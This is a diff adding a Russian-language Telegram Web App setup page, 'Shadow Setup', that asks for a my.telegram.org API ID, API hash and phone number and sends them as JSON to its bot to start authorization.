@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadow Setup</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: sans-serif; background-color: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); padding: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background-color: var(--tg-theme-button-color, #3390ec); color: var(--tg-theme-button-text-color, #fff); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h3>Настройка Shadow</h3>
+    <p>Введите данные от my.telegram.org</p>
+    
+    <input type="number" id="api_id" placeholder="API ID">
+    <input type="text" id="api_hash" placeholder="API HASH">
+    <input type="tel" id="phone" placeholder="Номер телефона (+7...)">
+    
+    <button onclick="sendData()">Начать авторизацию</button>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        function sendData() {
+            const api_id = document.getElementById('api_id').value;
+            const api_hash = document.getElementById('api_hash').value;
+            const phone = document.getElementById('phone').value;
+
+            if (!api_id || !api_hash || !phone) {
+                tg.showAlert("Заполните все поля!");
+                return;
+            }
+
+            const data = JSON.stringify({
+                action: "init_auth",
+                api_id: api_id,
+                api_hash: api_hash,
+                phone: phone
+            });
+
+            tg.sendData(data);
+        }
+    </script>
+</body>
+</html>
